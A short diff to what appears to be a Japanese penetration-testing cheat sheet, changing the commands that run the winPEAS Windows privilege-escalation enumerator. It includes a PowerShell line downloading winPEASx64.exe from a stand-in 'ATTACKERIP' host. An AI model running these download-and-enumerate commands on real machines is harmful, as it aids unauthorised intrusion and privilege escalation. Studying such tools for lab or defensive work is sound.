@@ -231,7 +231,7 @@ powershell -Command "Invoke-WebRequest -Uri http://ATTACKERIP/winPEASx64.exe -Ou
 ```
 #### 2. 実行（PowerShellまたはcmd）
 ```
-winPEASx64.exe           ← 自動で幅広く調査
-winPEASx64.exe quiet     ← 非常に静かに実行（出力最小）
-winPEASx64.exe systeminfo userinfo servicesinfo
+.\winPEASx64.exe           ← 自動で幅広く調査
+.\winPEASx64.exe quiet     ← 非常に静かに実行（出力最小）
+.\winPEASx64.exe systeminfo userinfo servicesinfo
 ```
